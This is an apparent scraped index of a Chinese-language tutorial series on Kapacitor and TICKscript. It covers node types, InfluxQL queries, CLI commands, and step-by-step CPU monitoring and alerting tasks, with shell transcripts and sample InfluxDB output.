&quot;usage_idle&quot;) .as(&apos;used&apos;) |window() .period(span) .every(frequency) |mean(&apos;used&apos;) .as(&apos;stat&apos;)...var alert = data |eval(lambda: sigma(&quot;stat&quot;)) .as(&apos;sigma&apos;) .keep() |alert() .id(&apos;{{ index .Tags &quot;host&quot;}}/cpu_used&apos;)... 在上面的示例13中，在第一部分中，创建了五个节点。顶级节点stream分配给变量data。所述stream然后节点被用作管道输送到该节点的根from，eval，window和mean按顺序链的。在第二部分中，然后使用赋值给变量扩展管道alert，以便可以将第二个eval节点应用于数据。 数据类型转换 在lambda表达式中，可以使用无状态转换函数在类型之间转换值。 bool() - converts a string, int64 or float64 to Boolean. int() - converts a string, float64, Boolean or duration type to an int64. float() - converts a string, int64 or Boolean to float64. string() - converts an int64, float64, Boolean or duration value to a string. duration() - converts an int64, float64 or string to a duration type.","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/B_TICKscript%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"title":"02-TICKscript语言-F-节点","text":"TICKscript节点 节点分类 TICKscript节点节点分类 A 定义数据获取方式：批、流 B、C 确定待处理的数据集 D、E 用于处理数据 NO. 节点分类 节点 含义 A 数据源定义节点 顶级节点定义数据来源 A 数据源定义节点 BatchNode 顶级节点，定义了：批处理模式 A 数据源定义节点 StreamNode 顶级节点，定义了：流处理模式 B 数据定义节点 定义待处理的数据帧或数据流 B 数据定义节点 QueryNode 只能跟着BatchNode B 数据定义节点 FromNode 只能跟着StreamNode B 数据定义节点 SideloadNode 基于来自各种源的分层数据向点添加字段和标签 C 数据操作节点 更改或生成数据集内的值 C 数据操作节点 DefaultNode 用于为数据系列中的tag和field设置默认值 C 数据操作节点 ShiftNode 用于移动数据点时间戳 C 数据操作节点 WhereNode 用于过滤 C 数据操作节点 WindowNode 用于在移动时间范围内缓存数据 D 处理节点 用于更改数据结构 D 处理节点 CombineNode 用于将来自单个节点的数据与自身组合在一起 D 处理节点 EvalNode 用于对表达式命名 D 处理节点 GroupByNode 按照标签Tag对传如数据进行分组 D 处理节点 JoinNode 根据匹配的时间戳连接来自任意数量管道的数据 D 处理节点 UnionNode 可以将任意数量的管道进行联合 D 处理节点 用于转换或处理数据集中数据点 D 处理节点 DeleteNode 从数据点删除字段Field和标记Tag D 处理节点 DerivativeNode 求导数 D 处理节点 FattenNode 在特定维度上展平一组点 D 处理节点 InfluxQLNode 提供对InfluxQL功能的访问 D 处理节点 StateDurationNode 计算给定状态持续时间 D 处理节点 StatsNode 给定时间间隔发出有关另一个节点内部统计信息 D 处理节点 BarrierNode 可以在没有数据流量的情况下执行管道 D 处理节点 ChangeDetectNode 如果字段值发生变化则创建节点 D 处理节点 StateCountNode 计算连续点的在一个给定的状态的数目 D 处理节点 用于触发事件 D 处理节点 AlertNode 配置警报发射 D 处理节点 DeadmanNode 实际上是辅助函数，它是alert当数据流低于指定阈值时触发的别名 D 处理节点 HTTPOutNode 为其收到的每个组缓存最新数据，使用字符串参数作为最终定位器上下文，使其可通过Kapicator http服务器使用 D 处理节点 HTTPPostNode 将数据发布到字符串数组中指定的HTTP端点 D 处理节点 InfluxDBOutNode 在收到数据时将数据写入InfluxDB D 处理节点 K8sAutoscaleNode 触发Kubernetes™资源的自动缩放 D 处理节点 KapacitorLoopback 将数据写回kapacitor流 D 处理节点 SwarmAutoscaleNode 触发Docker Swarm模式集群上的服务的自动调度事件。该节点还输出触发事件的点 D 处理节点 EC2AutoscaleNode 触发AWS Autoscaling组上的组的自动调度事件 D 处理节点 LogNode 记录通过它的所有数据 E 用户自定义的函数UDF UDFNode 用于实现由用户或脚本定义的功能 F 内部使用节点 NoOpNode 不要用 节点属性方法Nodes官方文档 数据源定义节点batch or stream？ 使用哪个取决于系统资源和正在进行的计算类型。 Batch Stream 适应场景 时间段长，数据量大 时间段较小 特点 触发查询时将导致InfluxDB负载高 降低了InfluxDB的查询负载，将数据全部缓存在内存中 在长时间内使用大量数据时batch首选，它会将数据保留在磁盘上，直到需要它为止，但触发时查询将导致数据库突然出现高负载。 使用较小的时间帧时 stream是首选。这意味着不必要地将数十亿个数据点保存在内存中，它降低了InfluxDB的查询负载。 数据定义节点数据操作节点处理节点-用于更改数据结构处理节点-用于转换或处理数据集中数据点处理节点-用于触发事件","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/F_TICKscript%E8%8A%82%E7%82%B9%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/"},{"title":"02-TICKscript语言-G-节点链接方法","text":"TICKscript节点链接方法链接方法概览 节点 说明 进节点 出节点 BatchNode 顶级节点，定义了批数据源 0 3 StreamNode 顶级节点，定义了流数据源 0 3 QueryNode 只能跟着BatchNode 2 28 FromNode 只能跟着StreamNode 1 28 SideloadNode 基于来自各种源的分层数据向点添加字段和标签 31 29 DefaultNode 用于为数据系列中的tag和field设置默认值 31 29 ShiftNode 用于移动数据点时间戳 31 29 WhereNode 用于过滤 30 29 WindowNode 用于在移动时间范围内缓存数据 31 29 CombineNode 用于将来自单个节点的数据与自身组合在一起 31 29 EvalNode 用于对表达式命名 31 29 GroupByNode 按照标签Tag对传如数据进行分组 29 29 JoinNode 根据匹配的时间戳连接来自任意数量管道的数据 31 29 UnionNode 可以将任意数量的管道进行联合 31 29 DeleteNode 从数据点删除字段Field和标记Tag 31 29 DerivativeNode 求导数 31 29 FattenNode 在特定维度上展平一组点 31 29 InfluxQLNode 提供对InfluxQL功能的访问 31 29 StateDurationNode 计算给定状态持续时间 31 29 StatsNode 给定时间间隔发出有关另一个节点内部统计信息 35 29 BarrierNode 可以在没有数据流量的情况下执行管道 31 29 ChangeDetectNode 如果字段值发生变化则创建节点 31 29 StateCountNode 计算连续点的在一个给定的状态的数目 31 29 AlertNode 配置警报发射 33 27 DeadmanNode 实际上是辅助函数，它是alert当数据流低于指定阈值时触发的别名 0 0 HTTPOutNode 为其收到的每个组缓存最新数据，使用字符串参数作为最终定位器上下文，使其可通过Kapicator http服务器使用 31 29 HTTPPostNode 将数据发布到字符串数组中指定的HTTP端点 31 29 InfluxDBOutNode 在收到数据时将数据写入InfluxDB 31 1 K8sAutoscaleNode 触发Kubernetes™资源的自动缩放 31 29 KapacitorLoopback 将数据写回kapacitor流 31 1 SwarmAutoscaleNode 触发Docker Swarm模式集群上的服务的自动调度事件。该节点还输出触发事件的点 30 29 EC2AutoscaleNode 触发AWS Autoscaling组上的组的自动调度事件 31 29 LogNode 记录通过它的所有数据 30 29 UDFNode 实现由用户或脚本定义的功能 0 29 NoOpNode 不要用 0 29 管道流速查参见速查excel表格","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/G_TICKscript%E8%8A%82%E7%82%B9%E9%93%BE%E6%8E%A5%E6%96%B9%E6%B3%95/"},{"title":"02-TICKscript语言-H-InfluxQL","text":"TICKscript InfluxQL 示例30 - 一个简单的InfluxQL查询语句 例31 - 带变量的简单InfluxQL查询语句 示例32 - 带有函数调用的InfluxQL查询语句 TICKscript InfluxQLInfluxQL主要在query节点中发生在TICKscript中，其链接方法采用InfluxQL查询字符串。这几乎总是一个SELECT声明。 InfluxQL的语法与SQL非常相似。当编写一个TICKscript查询字符串query节点，一般只有三个条款将被要求：SELECT，FROM和WHERE。一般模式如下： 1SELECT {&lt;FIELD_KEY&gt; | &lt;TAG_KEY&gt; | &lt;FUNCTION&gt;([&lt;FIELD_KEY&gt;|&lt;TAG_KEY])} FROM &lt;DATABASE&gt;.&lt;RETENTION_POLICY&gt;.&lt;MEASUREMENT&gt; WHERE {&lt;CONDITIONAL_EXPRESSION&gt;} SELECT子句可以使用一个或多个字段或标记键或函数。这些可以与数学运算和字面值组合。它们的值或结果将添加到数据框中，并且可以使用AS子句别名。星号*外卡还可用于从测量中检索所有标签和字段。 使用该AS子句时，可以稍后使用双引号将别名标识符作为命名结果在TICKscript中访问。 该FROM子句需要数据库，保留策略和将从中选择值的度量名称。这些令牌中的每一个都用点分隔。需要使用双引号设置数据库和保留策略的值。 该WHERE子句需要条件表达式。这可能包括AND和OR布尔运算符以及数学运算。 示例30 - 一个简单的InfluxQL查询语句12345batch |query(&apos;SELECT cpu, usage_idle FROM &quot;telegraf&quot;.&quot;autogen&quot;.cpu WHERE time &gt; now() - 10s&apos;) .period(10s) .every(10s) |httpOut(&apos;dump&apos;) 示例30显示了一个简单的SELECT语句，该语句从过去十秒内记录的cpu测量中获取cpu标记和usage_idle字段。 例31 - 带变量的简单InfluxQL查询语句12345678var my_field = &apos;usage_idle&apos;var my_tag = &apos;cpu&apos;batch |query(&apos;SELECT &apos; + my_tag + &apos;, &apos; + my_field + &apos; FROM &quot;telegraf&quot;.&quot;autogen&quot;.cpu WHERE time &gt; now() - 10s&apos;) .period(10s) .every(10s) |httpOut(&apos;dump&apos;) 示例31重复了示例30中的相同查询，但显示了如何将变量添加到查询字符串。 示例32 - 带有函数调用的InfluxQL查询语句1234567...var data = batch |query(&apos;&apos;&apos;SELECT 100 - mean(usage_idle) AS stat FROM &quot;telegraf&quot;.&quot;autogen&quot;.&quot;cpu&quot; WHERE cpu = &apos;cpu-total&apos; &apos;&apos;&apos;) .period(period) .every(every) .groupBy(&apos;host&apos;)... 示例32显示了一个SELECT语句，该语句包含SELECT子句中的函数和数学运算，以及ASalias子句。 请注意，select语句将直接传递给InfluxDB API。在InfluxQL查询字符串字段和标记名称中不需要使用双引号访问，就像TICKscript中的其他情况一样。但是，数据库名称和保留策略确实包含在双引号中。字符串文字，例如&apos;cpu-total&apos;在带有单引号的查询字符串中表示。 有关使用查询语言的完整介绍，请参阅InfluxQL文档。","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/H_TICKscriptInfluxQL/"},{"title":"04-Kapcitor命令行-A-基础命令","text":"kapacitor基础命令 基础命令 课堂练习 课堂练习2 kapacitor基础命令基础命令123456kapacitor define cpu_alert -tick cpu_alert.tickkapacitor list taskskapacitor enable cpu_alertkapacitor show cpu_alertkapacitor disable cpu_alertkapacitor list tasks 课堂练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293[root@tick:/var/lib/kapacitor/task]# kapacitor define cpu_alert -tick cpu_alert.tick[root@tick:/var/lib/kapacitor/task]# kapacitor list tasksID Type Status Executing Databases and Retention Policiescpu_alert stream disabled false [&quot;telegraf&quot;.&quot;autogen&quot;][root@tick:/var/lib/kapacitor/task]# kapacitor enable cpu_alert[root@tick:/var/lib/kapacitor/task]# kapacitor list tasksID Type Status Executing Databases and Retention Policiescpu_alert stream enabled true [&quot;telegraf&quot;.&quot;autogen&quot;][root@tick:/var/lib/kapacitor/task]# kapacitor show cpu_alertID: cpu_alertError:Template:Type: streamStatus: enabledExecuting: trueCreated: 06 Sep 19 14:17 CSTModified: 06 Sep 19 14:18 CSTLastEnabled: 06 Sep 19 14:18 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:dbrp &quot;telegraf&quot;.&quot;autogen&quot;var data = stream |from() .database(&apos;telegraf&apos;) .retentionPolicy(&apos;autogen&apos;) .measurement(&apos;cpu&apos;) .groupBy(&apos;host&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |eval(lambda: 100.0 - &quot;usage_idle&quot;) .as(&apos;used&apos;) .keep()data |eval(lambda: float(&quot;used&quot;)) .as(&apos;float_value&apos;) .keep() |influxDBOut() .create() .database(&apos;out_booboo&apos;) .retentionPolicy(&apos;auto_gen&apos;) .measurement(&apos;booboo_t1_out&apos;) .tag(&apos;user&apos;, &apos;booboo&apos;)DOT:digraph cpu_alert {graph [throughput=&quot;0.00 points/s&quot;];stream0 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];stream0 -&gt; from1 [processed=&quot;0&quot;];from1 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from1 -&gt; eval2 [processed=&quot;0&quot;];eval2 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];eval2 -&gt; eval3 [processed=&quot;0&quot;];eval3 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];eval3 -&gt; influxdb_out4 [processed=&quot;0&quot;];influxdb_out4 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; points_written=&quot;0&quot; working_cardinality=&quot;0&quot; write_errors=&quot;0&quot; ];}[root@tick:/var/lib/kapacitor/task]# zy_influxConnected to http://localhost:8086 version 1.7.7InfluxDB shell version: 1.7.7&gt; show databasesname: databasesname----telegraf_internalgitlabchronografout_booboo&gt; use out_boobooUsing database out_booboo&gt; show measurementsname: measurementsname----booboo_t1_out&gt; select * from booboo_t1_out;name: booboo_t1_outtime cpu float_value host usage_guest usage_guest_nice usage_idle usage_iowait usage_irq usage_nice usage_softirq usage_steal usage_system usage_user used user---- --- ----------- ---- ----------- ---------------- ---------- ------------ --------- ---------- ------------- ----------- ------------ ---------- ---- ----1567750740000000000 cpu-total 2.618808569776064 influxdb 0 0 97.38119143022394 0.20917001338114363 0 0 0.008366800535238136 0 0.878514056191063 1.5227576974205699 2.618808569776064 booboo1567750800000000000 cpu-total 2.2907783617255006 influxdb 0 0 97.7092216382745 0.20901262437006282 0 0 0.00836050497479491 0 0.9280160522035655 1.1453891815440511 2.2907783617255006 booboo[root@tick:/var/lib/kapacitor/task]# kapacitor list tasksID Type Status Executing Databases and Retention Policiescpu_alert stream disabled false [&quot;telegraf&quot;.&quot;autogen&quot;] 课堂练习2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134[root@tick:/var/lib/kapacitor/task]# kapacitor show nginx_alert2ID: nginx_alert2Error:Template:Type: streamStatus: enabledExecuting: trueCreated: 06 Sep 19 15:38 CSTModified: 06 Sep 19 16:08 CSTLastEnabled: 06 Sep 19 16:08 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:dbrp &quot;telegraf&quot;.&quot;autogen&quot;var db = &apos;telegraf&apos;var rp = &apos;autogen&apos;var measurement = &apos;nginx&apos;var groupBy = [&apos;host&apos;, &apos;server&apos;, &apos;port&apos;]var name = &apos;主机CPU使用率大于10%&apos;var idVar = namevar message = &apos;{\\&apos;alert\\&apos;: \\&apos;主机 {{ index .Tags }} Nginx2\\&apos;,\\&apos;description\\&apos;: \\&apos;主机 {{ index .Tags &quot;host&quot; }} CPU 使用率 {{ index .Fields &quot;value&quot; }}% ，CPU 使用率过高会导致系统运行缓慢，应用出现异常等问题\\&apos;,\\&apos;suggestion\\&apos;: \\&apos;请查看CPU使用率高的进程/应用是否为异常导致\\&apos;}&apos;var idTag = &apos;alertID&apos;var levelTag = &apos;level&apos;var messageField = &apos;message&apos;var durationField = &apos;duration&apos;var outputDB = &apos;chronograf&apos;var outputRP = &apos;autogen&apos;var outputMeasurement = &apos;alerts&apos;var triggerType = &apos;threshold&apos;var crit = 0var data = stream |from() .database(db) .retentionPolicy(rp) .measurement(measurement) .groupBy(groupBy) |eval(lambda: &quot;active&quot;) .as(&apos;active_value&apos;)var datav = stream |from() .database(db) .retentionPolicy(rp) .measurement(measurement) .groupBy(groupBy) |eval(lambda: &quot;accepts&quot;) .as(&apos;accepts_value&apos;)var new = data |join(datav) .as(&apos;active&apos;, &apos;accepts&apos;) |eval(lambda: int(&quot;active.active_value&quot;) + int(&quot;accepts.accepts_value&quot;)) .as(&apos;new_value&apos;)var trigger = new |alert() .crit(lambda: &quot;new_value&quot; &gt; crit) .message(message) .id(idVar) .idTag(idTag) .levelTag(levelTag) .messageField(messageField) .durationField(durationField) .victorOps()trigger |eval(lambda: float(&quot;new_value&quot;)) .as(&apos;value&apos;) .keep() |influxDBOut() .create() .database(outputDB) .retentionPolicy(outputRP) .measurement(outputMeasurement)DOT:digraph nginx_alert2 {graph [throughput=&quot;0.00 points/s&quot;];stream0 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];stream0 -&gt; from3 [processed=&quot;1&quot;];stream0 -&gt; from1 [processed=&quot;1&quot;];from3 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from3 -&gt; eval4 [processed=&quot;1&quot;];eval4 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];eval4 -&gt; join6 [processed=&quot;1&quot;];from1 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from1 -&gt; eval2 [processed=&quot;1&quot;];eval2 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];eval2 -&gt; join6 [processed=&quot;1&quot;];join6 [avg_exec_time_ns=&quot;27.314µs&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];join6 -&gt; eval7 [processed=&quot;1&quot;];eval7 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];eval7 -&gt; alert8 [processed=&quot;1&quot;];alert8 [alerts_inhibited=&quot;0&quot; alerts_triggered=&quot;1&quot; avg_exec_time_ns=&quot;8.445753ms&quot; crits_triggered=&quot;1&quot; errors=&quot;0&quot; infos_triggered=&quot;0&quot; oks_triggered=&quot;0&quot; warns_triggered=&quot;0&quot; working_cardinality=&quot;1&quot; ];alert8 -&gt; eval9 [processed=&quot;1&quot;];eval9 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];eval9 -&gt; influxdb_out10 [processed=&quot;1&quot;];influxdb_out10 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; points_written=&quot;0&quot; working_cardinality=&quot;0&quot; write_errors=&quot;0&quot; ];}[root@tick:/var/lib/kapacitor/task]# zy_influx -database chronografConnected to http://localhost:8086 version 1.7.7InfluxDB shell version: 1.7.7&gt; select * from alerts order by time desc limit 1;name: alertstime active_value alertID alertName cpu duration host level message new_value port server triggerType value---- ------------ ------- --------- --- -------- ---- ----- ------- --------- ---- ------ ----------- -----1567757340000000000 1 主机CPU使用率大于10% 720000000000 influxdb CRITICAL {&apos;alert&apos;: &apos;主机 map[port:801 server:localhost host:influxdb] Nginx&apos;,&apos;description&apos;: &apos;主机 influxdb CPU 使用率 &lt;no value&gt;% ，CPU 使用率过高会导致系统运行缓慢，应用出现异常等问题&apos;,&apos;suggestion&apos;: &apos;请查看CPU使用率高的进程/应用是否为异常导致&apos;} 65 801 localhost 1&gt;","link":"/2020/04/14/booboo_tick/kapacitor/04_Kapacitor%E5%91%BD%E4%BB%A4%E8%A1%8C/A_%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"},{"title":"05-Kapacitor监控案例-A-从一个最基本的cpu.alert开始","text":"CPU Alert 开始之前 示范数据 Tickscript 语言 基础命令 创建一个最简单的 Stream Task Stream Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 声明脚本 4. 查看Task 创建一个包含数据库声明的 Stream Task Stream Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 声明脚本 4. 查看Task 启动 CPU Task 任务 任务说明 课堂练习 停止 CPU Task 任务 任务说明 课堂练习 创建一个带时间窗口的 Stream Task Stream Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 声明脚本 4. 启动Task 5. 查看Task列表 6. 查看Task任务明细 7. 查看Task日志 创建一个带过滤条件的 Stream Task Stream Task 要求 解题过程 第一种解法 第二种解法 创建一个可以触发告警的 Stream Task Stream Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 启动后查看日志 创建一个批处理的CPU任务 Batch Task 要求 解题过程 1. 画出DAG图 2. 编写 TICKscript 3. 启动后查看日志 总结 创建一个生产环境中设定的告警规则 从一个最基本的CPU Alert开始开始之前示范数据InfluxDB 数据库中telegraf.autogen.cpu的数据点示范 1234[root@tick:/var/lib/kapacitor/task]# zy_influx -format &apos;csv&apos; -database telegraf -execute &apos;select * from cpu limit 1&apos;name,time,cpu,host,usage_guest,usage_guest_nice,usage_idle,usage_iowait,usage_irq,usage_nice,usage_softirq,usage_steal,usage_system,usage_usercpu,1564963200000000000,cpu-total,influxdb,0,0,99.03894367190544,0.158783219116127,0,0,0.008357011532397735,0,0.2757813805708354,0.5181347150052392cpu,1564963260000000000,cpu-total,influxdb,0,0,98.7377748073443,0.20061857394411767,0,0,0.00835910724767157,0,0.3092869681602368,0.7439605450429597 Tag keys 1234[root@tick:/var/lib/kapacitor/task]# zy_influx -format &apos;csv&apos; -database telegraf -execute &apos;show tag keys from cpu&apos;name,tagKeycpu,cpucpu,host Field keys 123456789101112[root@tick:/var/lib/kapacitor/task]# zy_influx -format &apos;csv&apos; -database telegraf -execute &apos;show field keys from cpu&apos;name,fieldKey,fieldTypecpu,usage_guest,floatcpu,usage_guest_nice,floatcpu,usage_idle,floatcpu,usage_iowait,floatcpu,usage_irq,floatcpu,usage_nice,floatcpu,usage_softirq,floatcpu,usage_steal,floatcpu,usage_system,floatcpu,usage_user,float Tickscript 语言学习教程 基础命令官方帮助 创建一个最简单的 Stream TaskStream Task 要求流式获取 Influxdb数据库中 库名database：telegraf.autogen 测量名measurement：cpu 的数据点，输出到日志中。 解题过程1. 画出DAG图1234graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(LogNode) 2. 编写 TICKscript12345//cpu.tickstream |from() .measurement(&apos;cpu&apos;) |log() 3. 声明脚本1kapacitor define cpu -tick cpu.tick -dbrp telegraf.autogen 4. 查看Task1kapacitor list tasks 创建一个包含数据库声明的 Stream TaskStream Task 要求流式获取 Influxdb数据库中 库名database：telegraf.autogen 测量名measurement：cpu 的数据点，输出到日志中。 解题过程1. 画出DAG图1234graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(LogNode) 2. 编写 TICKscript1234567//cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |log() 3. 声明脚本1kapacitor define cpu -tick cpu.tick 4. 查看Task1kapacitor list tasks 启动 CPU Task 任务任务说明通过执行kapacitor enable &lt;TASK_ID&gt; &lt;TASK_ID&gt;..命令启动 cpu任务。 1kapacitor enable cpu 执行kapacitor show &lt;TASK_ID&gt; 查看任务状态。 1kapacitor show cpu 课堂练习12345678910111213141516171819202122232425262728293031323334[root@tick:/var/lib/kapacitor/task]# kapacitor enable cpu[root@tick:/var/lib/kapacitor/task]# kapacitor list cpucannot list &apos;cpu&apos; did you mean &apos;tasks&apos;, &apos;recordings&apos;, &apos;replays&apos;, &apos;topics&apos;, &apos;topic-handlers&apos; or &apos;service-tests&apos;?[root@tick:/var/lib/kapacitor/task]# kapacitor show cpuID: cpuError:Template:Type: streamStatus: enabledExecuting: trueCreated: 08 Sep 19 20:43 CSTModified: 08 Sep 19 20:43 CSTLastEnabled: 08 Sep 19 20:43 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:dbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |log()DOT:digraph cpu {graph [throughput=&quot;0.00 points/s&quot;];stream0 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];stream0 -&gt; from1 [processed=&quot;2&quot;];from1 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from1 -&gt; log2 [processed=&quot;2&quot;];log2 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];} 停止 CPU Task 任务任务说明通过执行kapacitor disable &lt;TASK_ID&gt; &lt;TASK_ID&gt;..命令停止 cpu任务。 1kapacitor disable cpu 执行kapacitor show &lt;TASK_ID&gt; 查看任务状态。 1kapacitor show cpu 课堂练习12345678910111213141516171819202122232425[root@tick:/var/lib/kapacitor/task]# kapacitor disable cpu[root@tick:/var/lib/kapacitor/task]# kapacitor show cpuID: cpuError:Template:Type: streamStatus: disabledExecuting: falseCreated: 08 Sep 19 20:43 CSTModified: 08 Sep 19 20:46 CSTLastEnabled: 08 Sep 19 20:43 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:dbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |log()DOT:digraph cpu {stream0 -&gt; from1;from1 -&gt; log2;} 创建一个带时间窗口的 Stream TaskStream Task 要求流式获取 Influxdb数据库中 库名database：telegraf.autogen 测量名measurement：cpu 时间窗口为：10min 计算usage_user每5分钟的平均值 输出到日志中。 解题过程1. 画出DAG图123456graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(WindowNode)--&gt;D D(InfluxQLNode)--&gt;E E(LogNode) 2. 编写 TICKscript123456789101112//cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |window() .period(10m) .every(5m) |mean(&apos;usage_user&apos;) .as(&apos;mean_usage_user&apos;) |log() 10 minute 的时间窗口，每5分钟计算一次5分钟的平均值。 3. 声明脚本1kapacitor define cpu -tick cpu.tick 4. 启动Task1kapacitor enable cpu 5. 查看Task列表1kapacitor list tasks 6. 查看Task任务明细1kapacitor show cpu 7. 查看Task日志kapacitor watch &lt;TASK_ID&gt;命令遵循与任务关联的日志 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@tick:/var/lib/kapacitor]# kapacitor show cpuID: cpuError:Template:Type: streamStatus: enabledExecuting: trueCreated: 08 Sep 19 20:43 CSTModified: 08 Sep 19 21:00 CSTLastEnabled: 08 Sep 19 21:00 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:// cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |window() .period(5m) .every(1m) |mean(&apos;usage_user&apos;) .as(&apos;mean_usage_user&apos;) |log()DOT:digraph cpu {graph [throughput=&quot;0.00 points/s&quot;];stream0 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];stream0 -&gt; from1 [processed=&quot;7&quot;];from1 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from1 -&gt; window2 [processed=&quot;7&quot;];window2 [avg_exec_time_ns=&quot;9.195µs&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];window2 -&gt; mean3 [processed=&quot;6&quot;];mean3 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;1&quot; ];mean3 -&gt; log4 [processed=&quot;6&quot;];log4 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];}[root@tick:/var/lib/kapacitor]# kapacitor watch cputs=2019-09-08T21:14:10.014+08:00 lvl=info msg=point service=kapacitor task_master=main task=cpu node=log4 prefix= name=cpu db= rp= group= field_mean_usage_user=1.172135513652473 time=2019-09-08T13:14:00Zts=2019-09-08T21:15:10.014+08:00 lvl=info msg=point service=kapacitor task_master=main task=cpu node=log4 prefix= name=cpu db= rp= group= field_mean_usage_user=1.0886898609303208 time=2019-09-08T13:15:00Z[root@tick:/var/lib/kapacitor]# kapacitor disable cpu 创建一个带过滤条件的 Stream TaskStream Task 要求在之前cpu任务的基础上，过滤tag，cpu = cpu-total的值 解题过程过滤有两种解法： 使用WhereNode过滤； 使用FromNode的节点方法where()过滤 第一种解法12345678910111213//cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) |where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |window() .period(10m) .every(5m) |mean(&apos;usage_user&apos;) .as(&apos;mean_usage_user&apos;) |log() DAG图 1234567graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(WhereNode)--&gt;D D(WindowNode)--&gt;E E(InfluxQLNode)--&gt;F F(LogNode) 该解法，一共有6个节点。 第二种解法12345678910111213//cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |window() .period(10m) .every(5m) |mean(&apos;usage_user&apos;) .as(&apos;mean_usage_user&apos;) |log() DAG图 123456graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(WindowNode)--&gt;D D(InfluxQLNode)--&gt;E E(LogNode) 该解法保持5个节点。 创建一个可以触发告警的 Stream TaskStream Task 要求在之前cpu任务的基础上，如果mean_usage_user &gt; 80则发出严重告警。 解题过程1. 画出DAG图DAG图 1234567graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(WindowNode)--&gt;D D(InfluxQLNode)--&gt;E E(LogNode)--&gt; F F(AlertNode) 2. 编写 TICKscript123456789101112131415161718//cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) .groupBy(*) |window() .period(10m) .every(5m) |mean(&apos;usage_user&apos;) .as(&apos;mean_usage_user&apos;) |log() |alert() .crit(lambda: &quot;mean_usage_user&quot; &gt; 80) .message(&apos;CPU is to high!&apos;) 